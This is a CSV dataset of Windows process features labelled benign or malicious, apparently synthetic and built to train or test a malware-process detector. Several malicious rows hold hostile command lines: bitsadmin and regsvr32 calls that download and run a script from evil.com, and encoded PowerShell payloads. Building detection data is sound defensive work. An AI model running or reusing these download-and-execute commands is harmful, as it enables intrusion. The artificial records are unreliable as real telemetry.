process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
calc.exe,8500,2401,C:\Windows\System32\calc.exe,37,7,63,135.34,63.9,1,0,8,1,8,3,0.869,1,128,1,1,0,0,0,0,0,1,3,0.8707,1
OneDrive.exe,2099,2097,C:\Windows\System32\OneDrive.exe,108,20,338,46.95,38.16,1,1,60,1,0,0,0.083,0,80,0,0,0,0,0,0,0,0,0,0.0276,0
OneDrive.exe,1946,3270,C:\Windows\System32\OneDrive.exe,90,11,407,126.01,62.42,1,1,40,0,0,0,0.069,0,95,0,0,0,0,0,0,0,0,0,0.0232,0
winlogon.exe,5619,9123,C:\Windows\System32\winlogon.exe,36,3,359,103.22,59.93,0,1,23,0,0,0,0.33,0,21,0,0,0,0,0,0,0,0,0,0.043,0
calc.exe,6209,3460,C:\Windows\System32\calc.exe,98,34,57,167.6,31.02,0,1,18,0,0,0,0.092,0,96,0,0,0,0,0,0,0,0,0,0.0461,0
SearchIndexer.exe,3255,9233,C:\Windows\System32\SearchIndexer.exe,73,16,298,88.63,9.64,1,1,7,0,0,0,0.202,0,64,0,0,0,0,0,0,0,0,0,0.0687,0
wmiprvse.exe,8173,2866,wmiprvse.exe -secured -Embedding,96,5,99,77.67,76.23,1,1,49,0,2,1,0.673,1,162,0,0,0,0,0,0,1,0,3,0.8554,1
svchost.exe,680,9132,C:\Windows\system32\svchost.exe -k netsvcs,109,23,452,56.08,66.01,0,1,11,0,0,0,0.192,0,85,0,0,0,0,0,0,0,0,0,0.0094,0
svchost.exe,1097,526,C:\Windows\system32\svchost.exe -k netsvcs,95,14,67,128.27,1.35,1,1,59,0,0,0,0.101,0,86,0,0,0,0,0,0,0,0,0,0.1087,0
calc.exe,5088,8273,C:\Windows\System32\calc.exe,64,4,56,127.9,116.56,1,0,14,1,2,3,0.935,1,145,1,1,0,0,0,0,0,1,3,0.7911,1
wininit.exe,2192,6417,C:\Windows\System32\wininit.exe,78,9,185,135.8,95.98,0,1,63,0,0,0,0.196,0,89,0,0,0,0,0,0,0,0,0,0.1361,0
MsMpEng.exe,2932,4403,"""C:\Program Files\Windows Defender\MsMpEng.exe""",54,32,472,115.28,19.13,0,1,19,0,0,0,0.13,0,56,0,0,0,0,0,0,0,0,0,0.1243,0
firefox.exe,4690,2700,C:\Windows\System32\firefox.exe,90,26,329,64.19,25.68,1,1,47,1,12,0,0.287,0,40,0,0,0,0,0,0,0,0,0,0.022,0
spoolsv.exe,1162,8150,C:\Windows\System32\spoolsv.exe,41,15,443,100.51,6.01,0,1,7,0,0,0,0.118,0,54,0,0,0,0,0,0,0,0,0,0.0932,0
calc.exe,5128,7425,C:\Windows\System32\calc.exe,70,37,97,68.32,81.67,1,1,33,0,0,0,0.282,0,100,0,0,0,0,0,0,0,0,0,0.0166,0
conhost.exe,2838,8189,C:\Windows\System32\conhost.exe,46,34,240,149.76,92.61,1,1,29,0,0,0,0.192,0,26,0,0,0,0,0,0,0,0,0,0.059,0
services.exe,1615,2776,C:\Windows\System32\services.exe,89,14,204,2.12,98.23,1,1,50,0,0,0,0.171,0,81,0,0,0,0,0,0,0,0,0,0.0061,0
winlogon.exe,9179,3488,C:\Windows\System32\winlogon.exe,93,1,78,101.89,35.03,1,1,56,0,0,0,0.256,0,92,0,0,0,0,0,0,0,0,0,0.0466,0
bitsadmin.exe,2601,6807,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),192,1,111,42.0,20.42,1,1,22,1,4,2,0.686,0,49,1,0,0,0,1,1,0,0,4,0.6323,1
calc.exe,4644,4542,C:\Windows\System32\calc.exe,119,4,314,177.66,63.2,0,1,57,0,0,0,0.179,0,72,0,0,0,0,0,0,0,0,0,0.0697,0
powershell.exe,687,3978,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...wD80rhp2KyFRMrqyPsN6leIHYbKCCp5veNIO7BYlzc3Eo=RdFXPpX0Xn6tqxl,144,8,92,51.9,69.0,1,1,32,1,3,0,0.708,0,75,0,0,0,0,1,1,0,0,4,0.8308,1
MsMpEng.exe,466,4895,"""C:\Program Files\Windows Defender\MsMpEng.exe""",65,8,300,56.61,75.56,0,1,43,0,0,0,0.103,0,37,0,0,0,0,0,0,0,0,0,0.1422,0
SearchIndexer.exe,4109,7302,C:\Windows\System32\SearchIndexer.exe,98,15,68,186.75,83.69,0,1,26,0,0,0,0.342,0,66,0,0,0,0,0,0,0,0,0,0.0963,0
MsMpEng.exe,5825,3319,"""C:\Program Files\Windows Defender\MsMpEng.exe""",92,30,466,124.65,60.29,1,1,6,0,0,0,0.307,0,24,0,0,0,0,0,0,0,0,0,0.007,0
svchost.exe,4046,7462,C:\Windows\system32\svchost.exe -k netsvcs,30,3,59,73.31,64.14,0,1,44,0,0,0,0.252,0,82,0,0,0,0,0,0,0,0,0,0.021,0
OneDrive.exe,1157,1971,C:\Windows\System32\OneDrive.exe,59,20,263,70.65,71.87,0,1,68,0,0,0,0.224,0,63,0,0,0,0,0,0,0,0,0,0.0077,0
powershell.exe,7607,7350,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...2q=Un8FXJ9Y/QKSkWcq/gyGhaXW8j5NyeHbFfKje9tC6dTs2RZzdh=uVlSjCndrxysBCi192hvvUxlHENYfm91DS9rpaV2IJVxOOHD7AnPTCXSwAv7xBtNwPFG=r5sHWhdaccvcvS9SuPt4mWmQTrL,233,7,122,19.59,75.56,1,1,40,1,2,2,0.657,0,129,0,0,0,0,1,1,0,0,4,0.8159,1
services.exe,3581,3776,C:\Windows\System32\services.exe,95,39,440,147.25,97.41,1,1,71,0,0,0,0.126,0,21,0,0,0,0,0,0,0,0,0,0.0031,0
svchost.exe,3442,4689,wmiprvse.exe -secured -Embedding,57,10,277,107.45,20.2,1,1,29,1,0,1,0.464,0,93,1,0,0,0,0,0,1,0,2,0.653,1
explorer.exe,8754,737,C:\Windows\Explorer.EXE,52,29,372,190.17,57.08,0,1,27,0,0,0,0.197,0,114,0,0,0,0,0,0,0,0,0,0.064,0
spoolsv.exe,7002,8354,C:\Windows\System32\spoolsv.exe,76,9,123,110.55,11.01,0,1,51,0,0,0,0.16,0,93,0,0,0,0,0,0,0,0,0,0.0623,0
System,4,9934,C:\Windows\System32\System,95,5,401,187.76,72.97,1,1,38,0,0,0,0.313,0,38,0,0,0,0,0,0,0,0,0,0.1117,0
conhost.exe,5016,9037,C:\Windows\System32\conhost.exe,58,11,486,63.52,52.26,0,1,41,0,0,0,0.265,0,77,0,0,0,0,0,0,0,0,0,0.1094,0
spoolsv.exe,2751,9763,C:\Windows\System32\spoolsv.exe,67,18,129,142.79,28.46,0,1,28,0,0,0,0.117,0,69,0,0,0,0,0,0,0,0,0,0.144,0
chrome.exe,8358,9613,chrome.exe --type=renderer --disable-gpu,25,19,280,162.56,91.44,0,1,13,1,15,0,0.143,0,42,0,0,0,0,0,0,0,0,0,0.0241,0
svchost.exe,7058,5179,C:\Windows\system32\svchost.exe -k netsvcs,104,18,359,159.04,22.83,1,1,56,0,0,0,0.263,0,90,0,0,0,0,0,0,0,0,0,0.1274,0
conhost.exe,409,8369,C:\Windows\System32\conhost.exe,58,23,327,13.11,65.71,0,1,42,0,0,0,0.186,0,84,0,0,0,0,0,0,0,0,0,0.1137,0
bitsadmin.exe,3873,7448,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),189,5,126,77.51,11.5,1,1,21,1,4,0,0.763,1,30,1,0,0,0,1,1,0,0,1,0.6126,1
lsass.exe,6896,9496,C:\Windows\System32\lsass.exe,71,32,295,166.07,16.67,1,1,17,0,0,0,0.25,0,69,0,0,0,0,0,0,0,0,0,0.0155,0
RuntimeBroker.exe,2305,4208,C:\Windows\System32\RuntimeBroker.exe,32,29,460,18.66,40.98,1,1,75,0,0,0,0.335,0,63,0,0,0,0,0,0,0,0,0,0.1001,0
svchost.exe,6242,1439,C:\Windows\System32\svchost.exe,47,2,83,31.01,101.1,1,0,14,1,4,1,0.699,1,133,1,1,0,0,0,0,0,1,2,0.9815,1
svchost.exe,7506,9654,wmiprvse.exe -secured -Embedding,66,8,243,92.15,88.9,1,1,27,0,2,2,0.774,1,165,1,0,0,0,0,0,1,0,3,0.5872,1
lsass.exe,2826,3245,C:\Windows\System32\lsass.exe,109,3,271,87.32,20.1,0,1,71,0,0,0,0.342,0,109,0,0,0,0,0,0,0,0,0,0.0078,0
spoolsv.exe,5356,3741,C:\Windows\System32\spoolsv.exe,28,18,125,69.93,79.46,0,1,23,0,0,0,0.234,0,63,0,0,0,0,0,0,0,0,0,0.085,0
powershell.exe,8146,3225,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...t8cWlbDBmlaZcrIZgTXAFRdv2I02AJTngyhQyovWn+EPP3VfU2sLMCv5OmRwMEcyB+Fqr1RC4aSuw8UYeFx8cIU53Ux6UpJzBHDKdO05ni7TNH6qN/ZtJsAFuOSaR=LO50y4tcdlu6NKt9rCY,213,8,84,43.26,63.23,1,1,44,1,2,0,0.569,1,42,0,0,0,0,1,1,0,0,4,0.9148,1
chrome.exe,5019,2465,chrome.exe --type=renderer --disable-gpu,21,15,180,193.27,52.44,1,1,14,1,18,0,0.068,0,99,0,0,0,0,0,0,0,0,0,0.0644,0
notepad.exe,1123,9284,C:\Windows\System32\notepad.exe,118,23,409,54.56,32.42,1,1,46,0,0,0,0.218,0,37,0,0,0,0,0,0,0,0,0,0.0955,0
conhost.exe,8468,6780,C:\Windows\System32\conhost.exe,64,10,342,24.06,88.57,1,1,41,0,0,0,0.092,0,47,0,0,0,0,0,0,0,0,0,0.1031,0
smss.exe,3794,4,C:\Windows\System32\smss.exe,22,38,427,120.57,60.42,1,1,27,0,0,0,0.128,0,110,0,0,0,0,0,0,0,0,0,0.1092,0
SearchIndexer.exe,2496,5384,C:\Windows\System32\SearchIndexer.exe,93,29,472,22.44,91.64,1,1,78,0,0,0,0.061,0,43,0,0,0,0,0,0,0,0,0,0.0832,0
MsMpEng.exe,2143,9474,"""C:\Program Files\Windows Defender\MsMpEng.exe""",41,15,70,18.67,58.19,1,1,31,0,0,0,0.123,0,73,0,0,0,0,0,0,0,0,0,0.1423,0
wininit.exe,9802,6915,C:\Windows\System32\wininit.exe,57,35,390,74.88,5.7,0,1,58,0,0,0,0.095,0,94,0,0,0,0,0,0,0,0,0,0.0386,0
wininit.exe,3740,2329,C:\Windows\System32\wininit.exe,33,8,340,72.07,85.26,1,1,35,0,0,0,0.212,0,44,0,0,0,0,0,0,0,0,0,0.0276,0
notepad.exe,9919,7679,C:\Windows\System32\notepad.exe,24,32,66,186.2,79.13,0,1,78,0,0,0,0.323,0,109,0,0,0,0,0,0,0,0,0,0.1037,0
SearchIndexer.exe,6723,9373,C:\Windows\System32\SearchIndexer.exe,53,29,429,138.93,84.94,0,1,10,0,0,0,0.263,0,54,0,0,0,0,0,0,0,0,0,0.0235,0
calc.exe,6330,7375,C:\Windows\System32\calc.exe,44,4,93,49.78,114.21,1,0,10,1,6,2,0.805,1,158,1,1,0,0,0,0,0,1,3,0.8889,1
notepad.exe,8987,2081,C:\Windows\System32\notepad.exe,24,9,117,105.46,1.9,0,1,63,0,0,0,0.32,0,101,0,0,0,0,0,0,0,0,0,0.1438,0
services.exe,7937,9952,C:\Windows\System32\services.exe,90,28,491,124.45,48.01,1,1,62,0,0,0,0.321,0,71,0,0,0,0,0,0,0,0,0,0.1445,0
wininit.exe,6058,4111,C:\Windows\System32\wininit.exe,112,24,214,131.33,44.1,0,1,16,0,0,0,0.122,0,53,0,0,0,0,0,0,0,0,0,0.1235,0
svchost.exe,5413,9731,C:\Windows\system32\svchost.exe -k netsvcs,72,31,361,189.07,3.55,0,1,64,0,0,0,0.227,0,33,0,0,0,0,0,0,0,0,0,0.1052,0
chrome.exe,2658,5171,chrome.exe --type=renderer --disable-gpu,64,2,264,57.22,59.87,1,1,24,0,3,0,0.136,0,112,0,0,0,0,0,0,0,0,0,0.1019,0
OneDrive.exe,8592,8299,C:\Windows\System32\OneDrive.exe,57,36,419,162.43,61.81,1,1,71,1,0,0,0.261,0,49,0,0,0,0,0,0,0,0,0,0.0607,0
svchost.exe,9531,4342,wmiprvse.exe -secured -Embedding,83,4,164,43.85,23.93,1,1,15,0,1,3,0.614,1,155,1,0,0,0,0,0,1,0,2,0.6576,1
winlogon.exe,8937,689,C:\Windows\System32\winlogon.exe,54,35,170,19.58,39.71,1,1,6,0,0,0,0.084,0,119,0,0,0,0,0,0,0,0,0,0.024,0
WmiPrvSE.exe,8491,8531,wmiprvse.exe -secured -Embedding,46,9,273,36.37,78.05,1,1,36,0,3,3,0.489,1,151,1,0,0,0,0,0,1,0,1,0.7831,1
MsMpEng.exe,6970,1445,"""C:\Program Files\Windows Defender\MsMpEng.exe""",86,15,109,45.3,22.64,1,1,49,0,0,0,0.188,0,31,0,0,0,0,0,0,0,0,0,0.0835,0
MsMpEng.exe,887,1625,"""C:\Program Files\Windows Defender\MsMpEng.exe""",86,19,308,133.56,43.76,0,1,32,0,0,0,0.178,0,97,0,0,0,0,0,0,0,0,0,0.0354,0
MsMpEng.exe,9670,569,"""C:\Program Files\Windows Defender\MsMpEng.exe""",26,19,306,47.9,1.42,0,1,5,0,0,0,0.145,0,57,0,0,0,0,0,0,0,0,0,0.0047,0
csrss.exe,1353,6724,C:\Windows\System32\csrss.exe,75,12,150,76.9,67.37,1,1,56,0,0,0,0.343,0,109,0,0,0,0,0,0,0,0,0,0.0589,0
firefox.exe,2725,9150,C:\Windows\System32\firefox.exe,51,31,494,61.3,22.6,1,1,19,1,8,0,0.232,0,78,0,0,0,0,0,0,0,0,0,0.0547,0
chrome.exe,4495,3138,chrome.exe --type=renderer --disable-gpu,75,17,486,196.93,29.18,1,1,60,1,15,0,0.154,0,20,0,0,0,0,0,0,0,0,0,0.0061,0
taskmgr.exe,5898,3326,C:\Windows\System32\taskmgr.exe,97,36,127,23.07,9.17,0,1,34,0,0,0,0.064,0,45,0,0,0,0,0,0,0,0,0,0.1442,0
notepad.exe,8268,9472,C:\Windows\System32\notepad.exe,62,38,251,127.55,79.15,0,1,58,0,0,0,0.309,0,44,0,0,0,0,0,0,0,0,0,0.042,0
WmiPrvSE.exe,8447,3682,wmiprvse.exe -secured -Embedding,37,11,137,55.55,18.79,1,1,33,0,3,2,0.583,1,99,1,0,0,0,0,0,1,0,1,0.7909,1
taskmgr.exe,846,7532,C:\Windows\System32\taskmgr.exe,91,10,430,75.59,33.04,0,1,58,0,0,0,0.225,0,34,0,0,0,0,0,0,0,0,0,0.0833,0
chrome.exe,7390,9828,chrome.exe --type=renderer --disable-gpu,56,33,54,28.91,55.63,1,1,28,0,13,0,0.134,0,87,0,0,0,0,0,0,0,0,0,0.0989,0
firefox.exe,8979,9109,C:\Windows\System32\firefox.exe,98,39,79,121.55,7.45,1,1,60,0,3,0,0.239,0,64,0,0,0,0,0,0,0,0,0,0.0769,0
SearchIndexer.exe,2614,9116,C:\Windows\System32\SearchIndexer.exe,87,17,165,21.86,94.14,1,1,15,0,0,0,0.128,0,48,0,0,0,0,0,0,0,0,0,0.1065,0
spoolsv.exe,3189,5485,C:\Windows\System32\spoolsv.exe,114,36,408,109.59,54.58,1,1,72,0,0,0,0.342,0,63,0,0,0,0,0,0,0,0,0,0.0724,0
System,4,2753,C:\Windows\System32\System,90,22,321,169.53,40.95,0,1,68,0,0,0,0.202,0,77,0,0,0,0,0,0,0,0,0,0.1416,0
chrome.exe,2366,9814,chrome.exe --type=renderer --disable-gpu,32,9,437,93.1,82.73,0,1,61,1,7,0,0.245,0,84,0,0,0,0,0,0,0,0,0,0.0406,0
firefox.exe,886,7731,C:\Windows\System32\firefox.exe,79,19,483,105.39,4.83,1,1,33,1,7,0,0.073,0,65,0,0,0,0,0,0,0,0,0,0.1159,0
spoolsv.exe,6712,7400,C:\Windows\System32\spoolsv.exe,41,18,388,175.93,47.97,1,1,30,0,0,0,0.186,0,73,0,0,0,0,0,0,0,0,0,0.0109,0
spoolsv.exe,8296,2678,C:\Windows\System32\spoolsv.exe,61,11,53,69.55,44.31,1,1,40,0,0,0,0.275,0,92,0,0,0,0,0,0,0,0,0,0.057,0
svchost.exe,9594,901,C:\Windows\System32\svchost.exe,30,9,205,79.79,60.54,1,0,115,1,5,2,0.829,1,222,0,0,1,1,0,0,0,0,3,0.5885,1
winlogon.exe,2218,3663,C:\Windows\System32\winlogon.exe,32,36,113,191.31,87.59,0,1,49,0,0,0,0.308,0,102,0,0,0,0,0,0,0,0,0,0.0573,0
MsMpEng.exe,9368,8849,"""C:\Program Files\Windows Defender\MsMpEng.exe""",23,23,478,1.69,21.67,0,1,18,0,0,0,0.284,0,47,0,0,0,0,0,0,0,0,0,0.0266,0
svchost.exe,3293,4322,C:\Windows\system32\svchost.exe -k netsvcs,49,23,150,139.61,85.25,1,1,50,0,0,0,0.156,0,63,0,0,0,0,0,0,0,0,0,0.0202,0
services.exe,3988,1484,C:\Windows\System32\services.exe,119,35,433,166.64,73.16,0,1,65,0,0,0,0.33,0,78,0,0,0,0,0,0,0,0,0,0.0957,0
SearchIndexer.exe,8486,4819,C:\Windows\System32\SearchIndexer.exe,111,37,239,61.5,38.41,0,1,79,0,0,0,0.236,0,114,0,0,0,0,0,0,0,0,0,0.0054,0
smss.exe,2267,4,C:\Windows\System32\smss.exe,113,3,138,76.06,39.71,1,1,14,0,0,0,0.099,0,50,0,0,0,0,0,0,0,0,0,0.0509,0
OneDrive.exe,9727,7675,C:\Windows\System32\OneDrive.exe,28,29,63,116.13,80.97,1,1,15,1,0,0,0.307,0,106,0,0,0,0,0,0,0,0,0,0.029,0
notepad.exe,5003,5163,C:\Windows\System32\notepad.exe,37,4,150,43.57,80.52,1,0,9,1,2,4,0.793,1,138,1,1,0,0,0,0,0,1,4,0.8804,1
smss.exe,6293,4,C:\Windows\System32\smss.exe,23,28,380,134.93,33.55,0,1,66,0,0,0,0.265,0,32,0,0,0,0,0,0,0,0,0,0.0293,0
spoolsv.exe,4086,2423,C:\Windows\System32\spoolsv.exe,82,26,335,165.8,47.89,1,1,39,0,0,0,0.265,0,70,0,0,0,0,0,0,0,0,0,0.0395,0
csrss.exe,6305,4628,C:\Windows\System32\csrss.exe,21,21,131,57.63,98.97,0,1,21,0,0,0,0.146,0,25,0,0,0,0,0,0,0,0,0,0.0482,0
SearchIndexer.exe,2968,3402,C:\Windows\System32\SearchIndexer.exe,36,33,289,36.4,61.5,0,1,6,0,0,0,0.328,0,80,0,0,0,0,0,0,0,0,0,0.0059,0
csrss.exe,2941,1126,C:\Windows\System32\csrss.exe,22,20,86,174.0,63.08,1,1,74,0,0,0,0.276,0,81,0,0,0,0,0,0,0,0,0,0.1264,0
powershell.exe,6542,2445,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...8+Wgd7/e7leKGivoaqXHhn173kiiNmhMhcvQtznAWYOfAY7TLRjHLgnDRPwBjY1TVO0aGDG658mJDEwzN8Nb=r79VbnkkyPxlZuPK+HSShKJgx9zWuQCJndTluI4tjv7e/MD,215,4,193,22.72,59.22,1,1,57,1,3,2,0.734,1,86,1,0,0,0,1,1,0,0,4,0.7606,1
mspaint.exe,1665,8275,C:\Windows\System32\mspaint.exe,39,5,114,56.67,88.41,1,0,10,1,1,3,0.784,1,189,1,1,0,0,0,0,0,1,4,0.7974,1
regsvr32.exe,3282,4538,regsvr32.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),224,1,37,52.64,13.04,1,1,35,1,3,2,0.567,0,66,1,0,0,0,1,1,0,0,1,0.7403,1
calc.exe,3777,6888,C:\Windows\System32\calc.exe,74,5,339,190.05,28.88,1,1,56,0,0,0,0.058,0,43,0,0,0,0,0,0,0,0,0,0.0696,0
smss.exe,7382,4,C:\Windows\System32\smss.exe,39,29,428,148.5,61.48,1,1,7,0,0,0,0.088,0,109,0,0,0,0,0,0,0,0,0,0.112,0
wininit.exe,9910,2728,C:\Windows\System32\wininit.exe,58,12,267,193.39,44.2,0,1,42,0,0,0,0.216,0,64,0,0,0,0,0,0,0,0,0,0.0614,0
OneDrive.exe,3039,6151,C:\Windows\System32\OneDrive.exe,86,29,419,98.02,16.12,0,1,29,1,0,0,0.268,0,109,0,0,0,0,0,0,0,0,0,0.0557,0
firefox.exe,4117,6038,C:\Windows\System32\firefox.exe,97,32,118,147.25,39.44,1,1,71,1,10,0,0.273,0,94,0,0,0,0,0,0,0,0,0,0.1352,0
powershell.exe,799,6363,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...ElJ=Oq5A/2+RDD7YzcVCtgMdmN1SbLIlcWnd3JWNKlYtYrrZaMKgsBTX0xRB=9niKXHfBArTxDZIWEPX3JnajU8Z4WkR83BPDVDb/Ht8D=L=ANKDC5iuVF2628AAj5y5jLd02epeUhr,207,9,168,33.83,60.79,1,1,53,1,2,0,0.695,0,115,0,0,0,0,1,1,0,0,4,0.6782,1
notepad.exe,3408,7597,C:\Windows\System32\notepad.exe,54,15,148,157.76,96.12,1,1,5,0,0,0,0.198,0,49,0,0,0,0,0,0,0,0,0,0.0043,0
wininit.exe,693,538,C:\Windows\System32\wininit.exe,32,10,148,63.93,40.1,0,1,36,0,0,0,0.35,0,44,0,0,0,0,0,0,0,0,0,0.0344,0
notepad.exe,5345,9184,C:\Windows\System32\notepad.exe,55,5,191,98.38,66.42,1,0,3,1,4,3,0.91,1,166,1,1,0,0,0,0,0,1,5,0.786,1
